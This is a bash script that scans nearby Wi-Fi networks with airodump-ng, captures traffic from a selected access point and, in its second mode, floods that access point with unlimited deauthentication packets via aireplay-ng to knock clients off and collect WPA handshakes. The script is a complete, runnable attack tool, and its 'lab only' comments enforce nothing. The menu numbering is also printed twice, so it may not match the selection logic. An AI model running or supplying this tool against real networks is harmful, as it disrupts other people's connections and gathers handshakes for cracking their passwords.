#!/usr/bin/env bash
# wireless_scan_capture.sh
# Last Edited by Charles Duoto on November 16, 2026
# Interactive dual-band scanner + targeted capture + optional deauth.
# Pure bash. Requires monitor mode already enabled.
# Authorized lab environments only.
#
# Usage:
#   sudo ./wireless_scan_capture.sh wlan0

set -euo pipefail

if [[ $# -ne 1 ]]; then
    echo "Usage: $0 <monitor_interface>"
    echo "Example: $0 wlan0"
    exit 1
fi

IFACE="$1"
SCAN_DIR="/tmp/haxvibez_scan_$$"
mkdir -p "$SCAN_DIR"
SCAN_PREFIX="$SCAN_DIR/scan"

cleanup() {
    rm -rf "$SCAN_DIR" 2>/dev/null || true
}
trap cleanup EXIT

echo "[*] Scanning both 2.4 GHz and 5 GHz on $IFACE for 15 seconds..."
echo "[*] Press Ctrl+C early if you already see what you need."
timeout 15 airodump-ng --band abg --write "$SCAN_PREFIX" --output-format csv "$IFACE" >/dev/null 2>&1 || true

CSV="$SCAN_PREFIX-01.csv"
if [[ ! -f "$CSV" ]]; then
    echo "[-] No scan results. Is $IFACE in monitor mode?"
    exit 1
fi

echo
echo "=== Nearby Networks ==="
# Parse APs from airodump CSV (stops at the client section)
awk -F, '
    /^BSSID/ { next }
    /^Station MAC/ { exit }
    NF > 13 && $1 ~ /^([0-9A-Fa-f]{2}:){5}/ {
        gsub(/ /, "", $1); gsub(/ /, "", $4); gsub(/ /, "", $6); gsub(/ /, "", $14)
        printf "%2d) %-17s  CH:%-3s  %s  %s\n", NR, $1, $4, $6, $14
    }
' "$CSV" | nl -w2 -s') '

echo
read -rp "Select network number (or q to quit): " CHOICE
if [[ "$CHOICE" == "q" || -z "$CHOICE" ]]; then
    echo "[*] Exiting."
    exit 0
fi

# Extract chosen BSSID and channel
BSSID=$(awk -F, -v n="$CHOICE" '
    /^BSSID/ { next }
    /^Station MAC/ { exit }
    NF > 13 && $1 ~ /^([0-9A-Fa-f]{2}:){5}/ {
        if (++count == n) { gsub(/ /, "", $1); print $1; exit }
    }
' "$CSV")

CHANNEL=$(awk -F, -v n="$CHOICE" '
    /^BSSID/ { next }
    /^Station MAC/ { exit }
    NF > 13 && $1 ~ /^([0-9A-Fa-f]{2}:){5}/ {
        if (++count == n) { gsub(/ /, "", $4); print $4; exit }
    }
' "$CSV")

if [[ -z "$BSSID" ]]; then
    echo "[-] Invalid selection."
    exit 1
fi

echo
echo "[*] Selected: $BSSID on channel $CHANNEL"
echo "1) Targeted packet capture only"
echo "2) Targeted capture + deauth (lab handshake collection)"
read -rp "Choice [1/2]: " ACTION

CAP_PREFIX="${PWD}/capture_${BSSID//:/}"
echo "[*] Writing capture to ${CAP_PREFIX}-01.cap"

if [[ "$ACTION" == "2" ]]; then
    echo "[*] Starting targeted capture in background..."
    airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$CAP_PREFIX" "$IFACE" >/dev/null 2>&1 &
    DUMP_PID=$!
    sleep 3
    echo "[*] Sending deauth packets (Ctrl+C to stop)..."
    echo "[!] Lab use only. This will disconnect clients from the selected AP."
    aireplay-ng --deauth 0 -a "$BSSID" "$IFACE" || true
    kill "$DUMP_PID" 2>/dev/null || true
else
    echo "[*] Starting targeted capture (Ctrl+C to stop)..."
    airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$CAP_PREFIX" "$IFACE"
fi

echo "[+] Capture finished. File: ${CAP_PREFIX}-01.cap"
